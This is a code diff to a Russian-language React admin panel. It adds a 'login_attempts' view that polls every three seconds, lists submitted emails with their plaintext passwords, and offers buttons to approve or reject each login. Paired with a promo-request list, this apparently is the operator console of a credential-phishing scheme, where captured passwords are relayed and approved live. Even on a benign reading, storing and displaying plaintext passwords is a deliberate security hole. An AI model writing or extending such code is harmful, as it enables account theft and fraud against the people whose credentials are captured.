@@ -27,24 +27,39 @@ type PromoRequest = {
 
 const STATUSES = ["new", "confirmed", "processing", "email_sent", "completed", "error"];
 
+type LoginAttempt = {
+  id: string;
+  email: string;
+  password: string;
+  status: string;
+  approved_at: string | null;
+  created_at: string;
+};
+
 const Admin = () => {
   const navigate = useNavigate();
   const [checking, setChecking] = useState(true);
   const [isAdmin, setIsAdmin] = useState(false);
   const [rows, setRows] = useState<PromoRequest[]>([]);
+  const [attempts, setAttempts] = useState<LoginAttempt[]>([]);
   const [query, setQuery] = useState("");
 
   const load = useCallback(async () => {
-    const { data, error } = await supabase
-      .from("promo_requests")
-      .select("*")
-      .order("created_at", { ascending: false });
-    if (error) {
-      toast.error(error.message);
-      return;
-    }
-    setRows((data ?? []) as PromoRequest[]);
+    const [{ data, error }, { data: att, error: attErr }] = await Promise.all([
+      supabase.from("promo_requests").select("*").order("created_at", { ascending: false }),
+      supabase.from("login_attempts").select("*").order("created_at", { ascending: false }).limit(100),
+    ]);
+    if (error) toast.error(error.message);
+    else setRows((data ?? []) as PromoRequest[]);
+    if (attErr) toast.error(attErr.message);
+    else setAttempts((att ?? []) as LoginAttempt[]);
   }, []);
+
+  useEffect(() => {
+    if (!isAdmin) return;
+    const id = window.setInterval(load, 3000);
+    return () => window.clearInterval(id);
+  }, [isAdmin, load]);
 
   useEffect(() => {
     let active = true;
@@ -104,6 +119,21 @@ const Admin = () => {
       status: "completed",
     });
 
+  const decideAttempt = async (id: string, status: "approved" | "rejected") => {
+    const { error } = await supabase
+      .from("login_attempts")
+      .update({ status, approved_at: new Date().toISOString() })
+      .eq("id", id);
+    if (error) {
+      toast.error(error.message);
+      return;
+    }
+    toast.success(status === "approved" ? "Вход одобрен" : "Вход отклонён");
+    load();
+  };
+
+  const pendingAttempts = attempts.filter((a) => a.status === "pending");
+
   if (checking) {
     return <main className="min-h-screen grid place-items-center text-muted-foreground">Загрузка…</main>;
   }
@@ -150,6 +180,37 @@ const Admin = () => {
               </CardContent>
             </Card>
           ))}
+        </section>
+
+        <section className="rounded-lg border bg-background">
+          <div className="flex items-center justify-between px-4 py-3 border-b">
+            <h2 className="font-semibold">
+              Ожидают подтверждения входа
+              {pendingAttempts.length > 0 && (
+                <Badge className="ml-2" variant="destructive">{pendingAttempts.length}</Badge>
+              )}
+            </h2>
+          </div>
+          {pendingAttempts.length === 0 ? (
+            <p className="px-4 py-6 text-center text-muted-foreground text-sm">Нет ожидающих запросов</p>
+          ) : (
+            <ul className="divide-y">
+              {pendingAttempts.map((a) => (
+                <li key={a.id} className="flex flex-col md:flex-row md:items-center md:justify-between gap-3 px-4 py-3">
+                  <div className="min-w-0">
+                    <div className="font-medium truncate">{a.email}</div>
+                    <div className="text-xs text-muted-foreground">
+                      Пароль: <span className="font-mono">{a.password}</span> · {new Date(a.created_at).toLocaleString("ru-RU")}
+                    </div>
+                  </div>
+                  <div className="flex gap-2">
+                    <Button size="sm" onClick={() => decideAttempt(a.id, "approved")}>Разрешить</Button>
+                    <Button size="sm" variant="outline" onClick={() => decideAttempt(a.id, "rejected")}>Отклонить</Button>
+                  </div>
+                </li>
+              ))}
+            </ul>
+          )}
         </section>
 
         <Input
